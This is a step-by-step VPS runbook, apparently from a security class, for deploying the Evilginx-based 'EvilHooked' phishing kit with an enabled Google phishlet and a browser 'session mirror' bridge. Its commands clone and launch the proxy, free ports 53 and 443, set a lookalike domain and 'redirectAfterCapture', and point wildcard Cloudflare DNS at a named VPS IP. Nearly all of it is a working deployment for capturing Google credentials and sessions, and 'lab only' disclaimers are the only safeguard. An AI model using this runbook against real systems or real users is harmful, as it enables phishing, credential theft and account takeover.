# simple_setup.md — dummy Linux VPS guide (from a real class run)

Do **one step**. Read the output. Then the next step.

**Lab only.** Isolated class VPS and a domain you control. Do not use real Google / Yahoo / Apple / bank / crypto accounts.

This is the path that actually worked on Ubuntu 24.04:

- SSH port **22022**
- Chromium was a **snap**
- `START.sh` brought up Chrome + the Node bridge
- Evilginx then **exited**, so it had to be started **again by itself**
- Restarting Ubuntu DNS dropped SSH once — that is normal

Replace these if your professor gave different numbers:

- VPS IP: `104.207.64.149`
- SSH: `ssh -p 22022 root@104.207.64.149`
- Git: `https://github.com/ECHOVSL/EvilHooked-Evilginx.git`
- Kit folder on this class VPS (after the zip unpack):  
  `/root/EvilHooked-Evilginx-main/EvilHooked-Evilginx-main/EvilHooked_Google_linux_amd64/EvilHooked_Google_linux_amd64`
- Lab domain in class: `Fake-page-site.space`

**Three PowerShell windows from class (then you restarted the laptop):**

| Window | What it was for |
| --- | --- |
| First SSH | install, `START.sh`, Chrome + Node |
| Second SSH | start Evilginx in the foreground |
| Third SSH | `ss` / health checks |

Closing the laptop **does not reboot the VPS**. Chrome/Node/Evilginx may still be running. Your laptop is just disconnected.

---

## START HERE — after you restarted your PC

### A. Log in again (one PowerShell is enough)

```bash
ssh -p 22022 root@104.207.64.149
```

### B. See what is still running

```bash
tmux ls
ps aux | grep -E 'evilginx|Xvfb|puppet-bridge|remote-debugging-port=9222' | grep -v grep
ss -lntup | grep -E ':53|:443|:1000|:9222|:9092'
```

### C. Stop everything (clean slate)

If `tmux ls` shows `lab`, attach and `Ctrl+C` in each tab, or:

```bash
tmux kill-session -t lab 2>/dev/null || true
pkill -f 'evilhooked/evilginx/evilginx' || true
pkill -f 'puppet-bridge/src/index.js' || true
pkill -f 'chrome-profile-cdp|remote-debugging-port=9222' || true
pkill Xvfb || true
sleep 1
ss -lntup | grep -E ':53|:443|:1000|:9222|:9092' || echo "ports free"
```

You want `ports free` (or no matching lines).

### D. Start again inside tmux

```bash
apt-get install -y tmux
tmux new -s lab
```

Then (still in tmux):

```bash
cd /root/EvilHooked-Evilginx-main/EvilHooked-Evilginx-main/EvilHooked_Google_linux_amd64/EvilHooked_Google_linux_amd64
export PATH="/snap/bin:$PATH"
export DISPLAY=:99
pgrep -a Xvfb || Xvfb :99 -screen 0 1920x1080x24 -ac >/tmp/xvfb.log 2>&1 &
sleep 1
bash evilhooked/start-puppet-chrome.sh
```

Wait for `Chrome CDP ready`. **New tmux tab** (`Ctrl+b` then `c`):

```bash
cd /root/EvilHooked-Evilginx-main/EvilHooked-Evilginx-main/EvilHooked_Google_linux_amd64/EvilHooked_Google_linux_amd64
export PATH="/snap/bin:$PATH"
node puppet-bridge/src/index.js evilhooked/puppet-google.json
```

**Another tmux tab:**

```bash
cd /root/EvilHooked-Evilginx-main/EvilHooked-Evilginx-main/EvilHooked_Google_linux_amd64/EvilHooked_Google_linux_amd64
./evilhooked/evilginx/evilginx -p evilhooked/evilginx/phishlets -c evilhooked/evilginx-config -developer
```

Leave that tab open. Detach with `Ctrl+b` then `d`. You may close PowerShell.

Check from a **new** SSH:

```bash
curl -sS http://127.0.0.1:1000/health
ss -lntup | grep -E ':53|:443|:1000|:9222|:9092'
```

Do **not** run `START.sh` if 1000/9222 are already in use.

---

## Why you still see `http://127.0.0.1:1000` (this is not the website)

Setting:

```
domain        : Fake-page-site.space
external_ipv4 : 104.207.64.149
```

does **not** change port 1000.

| Address | What it is | Open this in a browser on your laptop? |
| --- | --- | --- |
| `http://127.0.0.1:1000` | Puppet-bridge on the **VPS loopback** (Evilpuppet / mirror). The log `WEB modules: No module` means **this kit has no web dashboard**. | **No.** `127.0.0.1` on your PC is *your* PC, not the VPS. |
| `https://Fake-page-site.space` or `https://accounts.Fake-page-site.space` | Evilginx **HTTPS on port 443** (the public lab site) | **Yes**, after Cloudflare/DNS points at `104.207.64.149` |

`puppet-google.json` must stay `"host": "127.0.0.1"`. That is on purpose so 1000 is not on the internet.

**To see `/health` from the VPS (SSH only):**

```bash
curl -sS http://127.0.0.1:1000/health
```

**Optional: peek at 1000 from your laptop without publishing it** (SSH tunnel):

```bash
ssh -p 22022 -L 1000:127.0.0.1:1000 root@104.207.64.149
```

Then on the laptop: `http://127.0.0.1:1000/health`  
That page is a **session mirror helper**, not an admin panel.

The GitHub “EvilHooked Dashboard / PANEL” is a **different WEB module**. This Google binary printed:

`WEB modules: No module`

There is nothing to log into at `:1000`.

**Lab site in the browser (class domain):**

1. Cloudflare DNS (grey cloud) for `Fake-page-site.space` and `*` (and `accounts`) → `104.207.64.149` (Step 15).
2. In the Evilginx tmux tab, `config` should show `Fake-page-site.space` and `104.207.64.149`.
3. `phishlets` should show `google` **enabled**.
4. Open **https://accounts.Fake-page-site.space/** (HTTPS, port 443 — not `:1000`).
5. Certificate warning is normal (`-developer`). Continue only in the isolated lab browser profile.

If the hostname does not resolve, the browser will fail even though Evilginx is up. Check:

```bash
dig +short Fake-page-site.space
dig +short accounts.Fake-page-site.space
```

You want `104.207.64.149` (grey cloud).

---

## Step 1 — Open PowerShell on your laptop

Start → type `PowerShell` → Enter.

---

## Step 2 — Log in to the VPS

```bash
ssh -p 22022 root@104.207.64.149
```

First time: type `yes`. Password: nothing moves while you type. That is normal.

Success: the prompt looks like `root@sysworkspace:~#` (your hostname may differ).

---

## Step 3 — Install git, then clone the repo (this puts the code on the VPS)

You do **not** need to zip/upload from the laptop if git works.

```bash
apt-get update
apt-get install -y git unzip curl ca-certificates gnupg python3 fonts-liberation
```

```bash
cd /root
git clone https://github.com/ECHOVSL/EvilHooked-Evilginx.git
ls /root/EvilHooked-Evilginx
```

You should see files/folders under `/root/EvilHooked-Evilginx`.

---

## Step 4 — Find the Linux kit (`START.sh`)

The zip and git layouts nest folders. Do not guess. Ask the computer:

```bash
find /root/EvilHooked-Evilginx -name START.sh
```

**If it prints a path** (example):

`/root/EvilHooked-Evilginx/EvilHooked_Google_linux_amd64/EvilHooked_Google_linux_amd64/START.sh`

Go there (use **your** path from `find`):

```bash
cd /root/EvilHooked-Evilginx/EvilHooked_Google_linux_amd64/EvilHooked_Google_linux_amd64
ls
```

You **must** see:

- `START.sh`
- `evilhooked`
- `puppet-bridge`

Check it is Linux, not Windows:

```bash
file evilhooked/evilginx/evilginx
```

You want `ELF`. You do **not** want `PE32` or `evilginx.exe`.

**If `find` prints nothing:** this GitHub tree may only have YAML/`playwright`, not the binary kit. Stay in SSH and tell your professor. Do not continue without `START.sh`.

From here on, “the kit folder” means the folder that contains `START.sh`. Stay in it.

---

## Step 5 — Node.js 20, fake screen, Chromium

```bash
curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
apt-get install -y nodejs
node -v
```

You want `v20.something`. (A later `npm` warning that Puppeteer wants Node 22 can be ignored for this lab.)

```bash
apt-get install -y xvfb chromium-browser || apt-get install -y xvfb chromium
which chromium-browser || which chromium || which google-chrome
```

You want a path, for example `/usr/bin/chromium-browser`.

On Ubuntu 24.04, Chromium is often a **snap**. You will see a warning about `/snap/bin`. Later we add that to `PATH`. Ignore “System restart required” for now.

---

## Step 6 — Free ports 53 and 443

**Port 53** (Ubuntu’s DNS stub; skip this and Evilginx cannot bind DNS):

```bash
ss -lntup | grep ':53' || true
mkdir -p /etc/systemd/resolved.conf.d
echo -e '[Resolve]\nDNSStubListener=no' > /etc/systemd/resolved.conf.d/no-stub.conf
systemctl restart systemd-resolved
ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
```

**This can drop your SSH session** (`client_loop: send disconnect`). If PowerShell returns to `PS C:\Users\...>`:

```bash
ssh -p 22022 root@104.207.64.149
cd /the/kit/folder/from/step/4
```

**Port 443:**

```bash
systemctl stop nginx apache2 2>/dev/null || true
systemctl disable nginx apache2 2>/dev/null || true
```

“Not found” is fine.

---

## Step 7 — Start inside `tmux` (so closing the laptop does not kill the lab)

If you start the kit in a normal SSH window and then close PowerShell, **Evilginx dies**. Use `tmux`.

```bash
apt-get install -y tmux
tmux new -s lab
```

Your screen clears. You are still on the VPS, inside a session named `lab`.

**Keys you need**

| Keys | What it does |
| --- | --- |
| `Ctrl+b` then `d` | **Detach** (leave processes running, go back to normal SSH) |
| `tmux attach -t lab` | Come back after you closed the terminal |
| `Ctrl+b` then `c` | New tab inside tmux |
| `Ctrl+b` then `n` | Next tab |

Do the rest of the start **inside this tmux session**.

---

## Step 8 — Fake screen + Snap PATH

Still in `tmux`, still in the kit folder:

```bash
export PATH="/snap/bin:$PATH"
export DISPLAY=:99
pgrep -a Xvfb || Xvfb :99 -screen 0 1920x1080x24 -ac >/tmp/xvfb.log 2>&1 &
sleep 1
echo "DISPLAY is $DISPLAY"
```

You want: `DISPLAY is :99`

---

## Step 9 — Chrome as root (do this once)

```bash
nano evilhooked/start-puppet-chrome.sh
```

Find the `nohup "$CHROME"` block. Add these three lines next to the other `--` flags:

```
  --no-sandbox \
  --disable-dev-shm-usage \
  --disable-gpu \
```

Save: `Ctrl+O`, Enter, `Ctrl+X`.

---

## Step 10 — First start (`START.sh`)

```bash
chmod +x START.sh evilhooked/evilginx/evilginx evilhooked/start-evilginx.sh evilhooked/start-puppet-chrome.sh
export PATH="/snap/bin:$PATH"
export DISPLAY=:99
bash START.sh
```

Wait. First run runs `npm install` (can take a minute).

**Good lines**

- `Chrome CDP ready on port 9222`
- JSON like `{"ok":true,"phishlet":"google","mode":"mirror",...}`

**Normal but ugly**

- npm `EBADENGINE` (Node 20 vs 22)
- `EADDRINUSE: address already in use 127.0.0.1:1000`  
  Evilginx already started the bridge; `START.sh` tried a second copy. **Do not run `START.sh` again.**

---

## Step 11 — If ports 53/443 are missing, start Evilginx alone

In a **new tmux tab** (`Ctrl+b` then `c`):

```bash
ss -lntup | grep -E ':53|:443|:1000|:9222|:9092'
ps aux | grep -E 'evilginx|Xvfb' | grep -v grep
```

If you see Chrome/`node`/`Xvfb` but **no** `evilginx` and **no** `:53` / `:443`, start only the proxy (this is what fixed the class VPS):

```bash
cd /the/kit/folder/from/step/4
export PATH="/snap/bin:$PATH"
export DISPLAY=:99
./evilhooked/evilginx/evilginx -p evilhooked/evilginx/phishlets -c evilhooked/evilginx-config -developer
```

Leave this tab running. You want the banner and a table with `google` / `enabled`. The prompt should **not** come back.

Detach tmux: `Ctrl+b` then `d`. You can now close PowerShell. The lab keeps running.

---

## Step 12 — Prove it (any new SSH)

```bash
ssh -p 22022 root@104.207.64.149
curl -sS http://127.0.0.1:1000/health
echo
curl -sS http://127.0.0.1:9222/json/version
echo
ss -lntup | grep -E ':53|:443|:1000|:9222|:9092'
```

**Success looks like this class run**

| Line | Meaning |
| --- | --- |
| `"ok":true` … `"mode":"mirror"` | puppet-bridge |
| `"Browser": "Chrome/..."` | CDP |
| `udp *:53` `evilginx` | lab DNS |
| `tcp *:443` `evilginx` | HTTPS |
| `127.0.0.1:9092` `evilginx` | local capture (keep private) |
| `127.0.0.1:1000` `node` | bridge (keep private) |
| `127.0.0.1:9222` `chrome` | CDP (keep private) |

Do **not** open 1000 / 9092 / 9222 on the public internet.

---

## Step 13 — Come back after you closed the terminal

```bash
ssh -p 22022 root@104.207.64.149
tmux ls
tmux attach -t lab
```

You should see the Evilginx window still scrolling.

**If `tmux ls` says no sessions:** the lab died. Use **Step 16** (start again), not a blind second `START.sh` while old processes remain.

**If attach works but 53/443 are gone:** in a new tmux tab, run the **Evilginx-only** command from Step 11.

---

## Step 14 — Add a lab domain (required before a browser can use the VPS)

Shipped defaults (`evilhooked.com`, `127.0.0.1`, `google.auth.com`) are **not** your server.

Class domain already used in the Evilginx console: `Fake-page-site.space`.  
VPS IP: `104.207.64.149`.

You can set it in the **Evilginx window** (not by hoping `:1000` changes):

```
config domain Fake-page-site.space
config ipv4 external 104.207.64.149
phishlets hostname google Fake-page-site.space
phishlets enable google
config
```

`config` must show the new domain and IP. Restart Evilginx if you edited JSON files instead.

Stop Evilginx first (in the tmux tab where it is running): `Ctrl+C`. Leave Chrome/Node/Xvfb if they are still up.

Edit two files in the kit folder:

**A.** `evilhooked/evilginx-config/config.json`

Set:

- `general.domain` → `lab.example.com`
- `general.external_ipv4` → `104.207.64.149` (not `127.0.0.1`)
- `phishlets.google.hostname` → `google.lab.example.com`

**B.** `evilhooked/puppet-google.json`

Set:

- `phishDomain` → `google.lab.example.com`
- `redirectAfterCapture` → a URL on that same host (example `https://google.lab.example.com/`)

Keep `"host": "127.0.0.1"` and `"port": 1000`.

Start Evilginx again (Step 11 command). Check `ss` for `:443`.

---

## Step 15 — Cloudflare DNS (class pattern)

Use Cloudflare as **DNS** (and optional orange-cloud proxy). This is **not** “turn on antibot and run a campaign.” It only points the name at your VPS.

### 15a — Add the site

1. Log in to [Cloudflare](https://dash.cloudflare.com/).
2. **Add a site** → enter `lab.example.com`.
3. Choose a plan (Free is enough for a lab).
4. Cloudflare shows **two nameservers** (like `anna.ns.cloudflare.com`).
5. At your **registrar** (where you bought the domain), replace the domain’s nameservers with those two.
6. Wait until Cloudflare says the zone is **Active** (can be minutes to hours).

### 15b — DNS records

In Cloudflare → **DNS** → **Records**, create:

| Type | Name | Content | Proxy status |
| --- | --- | --- | --- |
| A | `@` | `104.207.64.149` | **DNS only** (grey cloud) |
| A | `*` | `104.207.64.149` | **DNS only** (grey cloud) |
| A | `google` | `104.207.64.149` | **DNS only** (grey cloud) |

Grey cloud = the browser talks **straight to the VPS** on 443. That matches this kit’s `-developer` certificates.

**Orange cloud (proxied)** hides the VPS IP but TLS is terminated at Cloudflare first. For this lab:

- Prefer **grey cloud**.
- If you must use orange cloud: Cloudflare **SSL/TLS** → **Full** (not **Full (strict)**). Strict needs a public CA on the VPS; `-developer` is a lab CA and will fail. **Flexible** needs origin HTTP on port 80; this kit listens on **443**, so Flexible usually fails.

Turn **off** “Always Use HTTPS” experiments until `dig` and a browser test work.

### 15c — Check DNS (laptop or VPS)

```bash
dig +short lab.example.com
dig +short google.lab.example.com
```

You want `104.207.64.149` (grey cloud). With orange cloud you may see Cloudflare IPs instead; that is expected.

From a **lab browser** (class profile): open `https://google.lab.example.com/`.  
You should get a TLS warning (developer cert). That is expected on grey cloud. Continue only in the isolated lab profile.

### 15d — Firewall

```bash
ufw allow OpenSSH
ufw allow 443/tcp
ufw enable
```

You can leave UDP 53 closed on the public firewall if **Cloudflare** is serving DNS. Students then use normal DNS (1.1.1.1), not `dig @104.207.64.149`.

---

## Step 16 — Start again after a reboot (or if tmux is gone)

SSH in, `cd` to the kit folder, `tmux new -s lab`, then:

```bash
export PATH="/snap/bin:$PATH"
export DISPLAY=:99
pgrep -a Xvfb || Xvfb :99 -screen 0 1920x1080x24 -ac >/tmp/xvfb.log 2>&1 &
sleep 1
bash evilhooked/start-puppet-chrome.sh
```

Wait until it says CDP ready (or check `curl -sS http://127.0.0.1:9222/json/version`).

**New tmux tab** (`Ctrl+b` `c`):

```bash
cd /the/kit/folder
export PATH="/snap/bin:$PATH"
node puppet-bridge/src/index.js evilhooked/puppet-google.json
```

**Another tmux tab:**

```bash
cd /the/kit/folder
./evilhooked/evilginx/evilginx -p evilhooked/evilginx/phishlets -c evilhooked/evilginx-config -developer
```

Then Step 12 health checks.

Use `bash START.sh` only on a **clean** machine (nothing on 1000/9222). On a machine that already ran once, `START.sh` may kill Chrome and start a second bridge (`EADDRINUSE`).

---

## Step 17 — Stop the lab

```bash
tmux attach -t lab
```

In each tab: `Ctrl+C`. Then:

```bash
pkill -f 'evilhooked/evilginx/evilginx' || true
pkill -f 'puppet-bridge/src/index.js' || true
pkill -f 'chrome-profile-cdp|remote-debugging-port=9222' || true
pkill Xvfb || true
tmux kill-session -t lab
```

---

## Quick “what went wrong”

| What you saw | Meaning | Fix |
| --- | --- | --- |
| `unzip: cannot find …zip` | File never copied | Use **git clone** (Step 3) |
| `cd: No such file` | Extra nested folder | `find … -name START.sh` |
| SSH `Connection reset` after DNS change | resolved restart | SSH again (Step 6) |
| `Chrome CDP ready` but no 53/443 | Evilginx exited | Step 11 only |
| `EADDRINUSE :1000` | Two bridges | Ignore; do not `START.sh` again |
| Health OK, browser from home fails | Domain still default / DNS | Steps 14–15 |
| Still `http://127.0.0.1:1000` after domain | 1000 is loopback, not the site | See “Why you still see 127.0.0.1:1000” |
| Laptop browser: `127.0.0.1:1000` refuses | That is your PC, not the VPS | Use `https://accounts.Fake-page-site.space/` or SSH `curl` |
| `WEB modules: No module` | No dashboard in this kit | Use Evilginx **console** (`config`, `phishlets`) |
| Orange cloud + certificate errors | Full Strict vs lab CA | Grey cloud, or SSL mode **Full** |
| Closed PowerShell, everything dead | No tmux | “START HERE — after you restarted your PC” |

---

## You are done when

1. Step 12 shows all five listeners.  
2. `dig` for your lab hostname returns the VPS (or Cloudflare IPs if orange).  
3. You can `tmux attach -t lab` after closing the laptop.

Do not skip from a healthy `ss` output to targeting real identity providers. Domain + Cloudflare here only make the **lab hostname** reach **your** VPS.
